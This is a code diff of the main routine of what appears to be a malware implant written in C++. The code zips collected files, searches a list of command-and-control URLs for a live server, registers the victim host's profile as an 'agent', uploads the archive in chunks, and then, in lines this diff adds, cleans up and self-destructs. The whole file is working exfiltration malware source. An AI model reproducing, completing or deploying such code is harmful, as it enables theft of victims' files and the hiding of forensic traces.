@@ -69,30 +69,38 @@ void GenZip() {
 
 
 int main() {
-
     std::wstring uid;
 
     // Mode 1: run once and then > cleanup > self destruct
-    if (ONETIMERUN) {  
-        GenZip(); 
-        bool ReachIntranet = googleConn(); 
-        if (ReachIntranet) { 
-            C2 = C2Conn(URLS); 
-            if (!C2.empty()) {
-                // Path to /add_agent
-                std::wstring PC2 = C2 + STAGE1PATH;
-                nlohmann::json JsonProfile = Profiler(); 
-                
-                nlohmann::json metadata = GenFileMetadata(zipDestStr, CHUNK_SIZE); 
-                JsonProfile["file_metadata"] = metadata;
+    if (ONETIMERUN) {
+        // If the zip file doesn't exist, it's the first run
+        if (!std::ifstream(zipDestStr).good()) {
+            // Process files and create a zip file
+            GenZip();
 
-                std::string response = SendData(L"POST", PC2, L"", JsonProfile, L"");
-                auto jsonResp = nlohmann::json::parse(response);
-                if (jsonResp.contains("message") && jsonResp["message"] == "created") {
-                    std::cout << "JSON response: " << jsonResp << std::endl;
+            // Try connecting to Google and then connect to all C2 URLs to find a live C2
+            bool ReachIntranet = googleConn();
+            if (ReachIntranet) {
+                C2 = C2Conn(URLS);
+                // When you find a live C2, you can connect to it and the client as an agent to the server
+                if (!C2.empty()) {
+                    // Path to /add_agent
+                    std::wstring PC2 = C2 + STAGE1PATH;
+                    nlohmann::json JsonProfile = Profiler();
+
+                    nlohmann::json metadata = GenFileMetadata(zipDestStr, CHUNK_SIZE);
+                    JsonProfile["file_metadata"] = metadata;
+
+                    // Send client's profiler to the server 
+                    std::string response = SendData(L"POST", PC2, L"", JsonProfile, L"");
+                    auto jsonResp = nlohmann::json::parse(response);
+                    if (jsonResp.contains("message") && jsonResp["message"] == "created") {
+                        std::cout << "JSON response: " << jsonResp << std::endl;
+                    }
                 }
             }
         }
+
         uid = GetUIDFromFile(); // once profiler is called, uid file is created
 
         // As long as the file upload status is incomplete, keep uploading bytes
@@ -131,9 +139,13 @@ int main() {
         } while (true);
 
         std::cout << "File upload has been completed." << std::endl;
+        Cleanup();
+        Sleep(2000);
+        SelfDestruct();
     }
 
     return 0;
 }
+
 
 
